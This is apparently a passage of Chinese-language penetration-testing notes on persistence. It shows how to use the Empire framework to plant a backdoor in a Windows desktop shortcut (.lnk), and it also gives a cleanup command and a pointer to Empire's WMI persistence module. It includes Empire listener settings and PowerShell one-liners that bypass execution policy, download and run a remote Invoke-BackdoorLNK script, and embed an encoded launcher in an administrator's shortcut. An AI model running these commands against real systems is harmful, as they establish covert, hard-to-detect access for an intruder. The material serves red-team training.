  #### LNK后门
	Empire
	Empire> set Host http://192.168.1.150
	Empire> set Port 8080
	>launcher powershell Listener's Name
	生成后只使用Base64的代码。
	>powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.107/ps/Invoke-BackdoorLNK.ps1');Invoke-BackdoorLNK -LNKPath 'C:\Users\Administrator.DC\Desktop\Easy CHM.lnk' -EncScript Base64编码"
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/539.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/540.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/541.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/542.png)

	清除后门
	>powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.107/ps/Invoke-BackdoorLNK.ps1');Invoke-BackdoorLNK -LNKPath 'C:\Users\Administrator.DC\Desktop\Easy CHM.lnk' -CleanUp"
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/543.png)
  #### WMI
	Empire>powershell/persistence/elevated/wmi